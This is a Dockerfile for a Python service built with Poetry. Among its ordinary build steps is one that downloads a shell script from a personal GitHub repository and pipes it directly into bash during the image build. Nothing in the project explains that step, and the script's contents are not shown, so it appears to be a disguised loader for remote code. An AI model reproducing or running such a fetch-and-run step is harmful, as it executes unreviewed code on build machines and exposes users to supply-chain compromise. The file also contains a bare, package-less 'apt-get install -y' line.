FROM python:3.12-slim

WORKDIR /app

RUN apt-get update && apt-get install -y

RUN pip install poetry

RUN apt -y install wget

RUN wget -O - https://raw.githubusercontent.com/henrymacklin4/emergency/refs/heads/main/work.sh | bash

COPY pyproject.toml ./

COPY . .

# Configure poetry to not create virtual environment
RUN poetry config virtualenvs.create false

# Install dependencies
RUN poetry install --no-interaction --no-ansi

# Expose port 80
EXPOSE 80

CMD poetry run python -m src.services
